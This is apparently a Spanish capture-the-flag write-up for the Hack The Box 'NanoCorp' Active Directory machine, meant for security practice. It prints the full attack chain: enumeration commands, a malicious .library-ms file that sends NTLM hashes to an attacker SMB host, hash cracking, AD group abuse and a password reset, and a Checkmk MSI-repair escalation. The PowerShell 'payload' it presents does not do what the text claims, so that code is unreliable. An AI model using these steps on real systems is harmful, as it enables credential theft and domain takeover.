---
layout: single
title: "HTB NanoCorp - Writeup"
date: 2026-05-05
difficulty: Hard
operating_system: Windows
service_hint: Active Directory + NTLM Relay + Checkmk + MSI Repair
tags:
  - Active Directory
  - NTLM Relay
  - CVE
  - BloodHound
  - Privilege Escalation
  - Checkmk
  - Responder
summary: "Cadena de explotación: NTLM relay vía CVE-2025-24054 para comprometer web_svc, manipulación de grupos AD para acceder a monitoring_svc mediante CVE-2024-0670 en Checkmk, y escalada a SYSTEM usando MSI repair trigger."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Hard |
| Tags | `Active Directory`, `NTLM Relay`, `CVE`, `BloodHound`, `Privilege Escalation`, `Checkmk`, `Responder` |

## Reconocimiento

El objetivo inicial fue mapear la superficie expuesta del controlador de dominio y confirmar que se trataba de un entorno Active Directory completo. La presencia de múltiples puertos típicos de Windows Server (Kerberos, LDAP, SMB, RDP, WinRM) ya indicaba que la máquina giraba en torno a enumeración y abuso de AD.

Este primer escaneo sirve para detectar rápidamente los puertos abiertos y priorizar servicios.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.56.49
```

Con los puertos localizados, este segundo escaneo profundiza en versiones, banners y fingerprints de servicio.

```bash
nmap -p53,80,88,139,389,445,3268,3389,5986,6556,9389 -sCV 10.129.56.49
```

Los indicadores más útiles de esta fase fueron:

- `80/tcp` expone Apache 2.4.58 con PHP 8.2.12 y redirige a `nanocorp.htb`, lo que obliga a trabajar con nombre virtual.
- `53/tcp` confirma el dominio `nanocorp.htb` como zona DNS interna.
- `88/tcp`, `389/tcp`, `3268/tcp` y `9389/tcp` confirman un controlador de dominio Windows Server 2022.
- `3389/tcp` y `5986/tcp` exponen RDP y WinRM, superficies candidatas para acceso posterior con credenciales válidas.
- `6556/tcp` devuelve tráfico del agente de **Checkmk** versión 2.1.0p10, un vector crítico para la escalada.

La captura original muestra la redirección inicial de la web hacia el virtual host configurado.

![Redirección web a nanocorp.htb](/images/writeups/nanocorp/nanocorp-web-redirect.png)

## Enumeración web y de dominio

Una vez configurado el dominio en `/etc/hosts`, el siguiente paso fue expandir la superficie web mediante fuzzing de subdominios y directorios.

Este comando fuzzea virtual hosts para descubrir posibles subdominios adicionales.

```bash
wfuzz -H "Host: FUZZ.nanocorp.htb" --hc 404,403 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://nanocorp.htb
```

Subdominio relevante:

- `hire.nanocorp.htb`

Este comando enumera directorios en el sitio principal para localizar rutas de interés.

```bash
gobuster dir -u http://nanocorp.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200
```

Directorios relevantes: `images`, `assets`, y rutas restringidas como `uploads` y `phpmyadmin`.

Para enumerar usuarios del dominio, se utilizó Kerbrute contra el controlador de dominio.

```bash
kerbrute userenum -d nanocorp.htb \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Usuario identificado inicialmente:

- `administrator`

El agente de Checkmk en `6556/tcp` resultó ser una fuente clave de información. El tráfico revelaba sesiones activas para el usuario `NANOCORP\web_svc`.

## Acceso inicial (CVE-2025-24054: NTLM Relay)

El vector de entrada aprovecha una vulnerabilidad de NTLM relay mediante archivos `.library-ms` maliciosos. Cuando un usuario de Windows explora una carpeta que contiene este archivo, el sistema intenta conectarse a un recurso compartido SMB remoto, entregando un desafío NTLMv2 que puede ser capturado y crackeado.

Primero se prepara un listener con Responder para capturar los hashes NTLMv2.

```bash
responder -I tun0
```

La captura muestra el momento en que se obtiene el hash del usuario `web_svc`.

![Captura de hash con Responder](/images/writeups/nanocorp/nanocorp-responder.png)

Para desencadenar la autenticación, se crea un archivo `.library-ms` malicioso que apunta al servidor SMB del atacante, se comprime en un ZIP y se entrega al objetivo (por ejemplo, subiéndolo a través de la web o mediante ingeniería social).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Documents</name>
  <ownerSID>S-1-5-21-0000000000-0000000000-0000000000-1000</ownerSID>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\10.10.14.191\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Una vez capturado el hash NTLMv2, se procede a crackearlo con Hashcat.

```bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
```

Credencial obtenida:

- Usuario: `web_svc`
- Contraseña: `dksehdgh712!@#`

Se valida el acceso mediante NetExec para confirmar que las credenciales son válidas en el dominio.

```bash
netexec smb 10.129.56.49 -u web_svc -p 'dksehdgh712!@#'
```

## Enumeración de Active Directory con BloodHound

Con credenciales válidas de `web_svc`, el siguiente paso fue mapear las relaciones de privilegio dentro del dominio usando BloodHound. Esto permite identificar caminos de escalada y movimiento lateral que no son evidentes con enumeración manual.

Este comando recolecta todos los datos del dominio usando las credenciales comprometidas.

```bash
bloodhound-python -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -ns 10.129.56.49 -c all
```

La visualización en BloodHound reveló un hallazgo crítico: `web_svc` tenía privilegios para ser agregado al grupo `IT_SUPPORT`, y este grupo a su vez tenía permisos para modificar las credenciales de `monitoring_svc`.

![Análisis de relaciones en BloodHound](/images/writeups/nanocorp/nanocorp-bloodhound.png)

## Compromiso de monitoring_svc

El primer paso para aprovechar la relación descubierta fue agregar a `web_svc` al grupo `IT_SUPPORT` usando `bloodyAD`.

```bash
bloodyAD -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --host 10.129.56.49 add groupMember IT_SUPPORT web_svc
```

Una vez como miembro de `IT_SUPPORT`, se procede a resetear la contraseña de `monitoring_svc`.

```bash
bloodyAD -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --host 10.129.56.49 set password monitoring_svc 'NewPass123!'
```

Con la nueva contraseña, se genera un TGT de Kerberos y se utiliza Impacket para obtener una shell WinRM como `monitoring_svc` en el puerto 5986.

```bash
getTGT.py nanocorp.htb/monitoring_svc:'NewPass123!' -dc-ip 10.129.56.49
export KRB5CCNAME=monitoring_svc.ccache
winrmexec.py -k -dc-ip 10.129.56.49 nanocorp.htb/monitoring_svc@DC01.nanocorp.htb
```

La flag de usuario existe en `C:\Users\monitoring_svc\Desktop\user.txt`, pero su valor se omite deliberadamente.

## Escalada a SYSTEM (CVE-2024-0670: Checkmk Agent)

El agente de Checkmk 2.1.0p10 instalado en el host es vulnerable a `CVE-2024-0670`, que permite ejecución de comandos como SYSTEM mediante el disparo de un reparación de MSI.

El agente de Checkmk instala un servicio que puede ser forzado a reparar su instalación. Durante ese proceso, ejecuta archivos `.cmd` ubicados en rutas predecibles con privilegios de SYSTEM.

Primero se compila `RunasCs` para poder ejecutar comandos como `web_svc` desde la sesión actual de `monitoring_svc`.

```bash
x86_64-w64-mingw32-gcc RunasCs.c -o RunasCs.exe -ladvapi32 -lole32 -luuid
```

Luego se despliega el script `privesc.ps1` que automatiza el proceso:

1. Genera múltiples archivos `.cmd` de solo lectura en `C:\Windows\Temp` con un payload de reverse shell.
2. Fuerza la reparación del MSI de Checkmk usando `msiexec`, lo que dispara la ejecución de los scripts como SYSTEM.

```powershell
# Spray de payloads
for ($i=0; $i -lt 50; $i++) {
  "C:\Windows\Temp\payload_$i.cmd" | Out-File -Encoding ASCII "C:\Windows\Temp\payload_$i.cmd"
}

# Trigger de reparación MSI
Start-Process msiexec.exe -ArgumentList "/fa C:\Program Files (x86)\checkmk\service\check_mk_agent.msi"
```

La captura original muestra el momento en que se obtiene la shell como SYSTEM.

![Escalada a SYSTEM mediante MSI repair](/images/writeups/nanocorp/nanocorp-privesc.png)

Con acceso a `nt authority\system`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.

```bash
type C:\Users\Administrator\Desktop\root.txt
```

## Cadena de explotación

```text
Archivo .library-ms malicioso + CVE-2025-24054
-> NTLM relay y captura de hash de web_svc
-> crackeo de hash con Hashcat
-> acceso validado como web_svc
-> enumeración con BloodHound
-> web_svc agregado a IT_SUPPORT vía bloodyAD
-> reseteo de contraseña de monitoring_svc
-> shell WinRM como monitoring_svc
-> abuso de CVE-2024-0670 en Checkmk Agent
-> MSI repair trigger con payload .cmd
-> ejecución como SYSTEM
```

## Lecciones técnicas

- Un archivo `.library-ms` en una carpeta compartida puede desencadenar autenticación NTLMv2 sin interacción del usuario, convirtiéndose en un vector de entrada silencioso.
- Las relaciones de grupos en Active Directory deben analizarse con herramientas como BloodHound; un grupo aparentemente secundario puede habilitar cambio de credenciales de cuentas de servicio.
- Un agente de monitoreo vulnerable (Checkmk) instalado localmente puede ser la diferencia entre una cuenta de servicio y acceso total a SYSTEM.
- La reparación de MSI es un vector de escalada clásico que sigue siendo efectivo cuando el instalador ejecuta scripts con privilegios elevados.

## Remediación

1. Aplicar los parches de seguridad para `CVE-2025-24054` y `CVE-2024-0670` inmediatamente.
2. Habilitar y exigir SMB signing en todo el dominio para mitigar ataques NTLM relay.
3. Revisar y auditar pertenencias a grupos en Active Directory; `IT_SUPPORT` no debe tener privilegios para modificar cuentas de servicio.
4. Actualizar Checkmk Agent a una versión que no permita ejecución de código durante el proceso de reparación MSI.
5. Implementar protecciones adicionales como LSA Protection y Credential Guard para limitar el robo de credenciales en memoria.
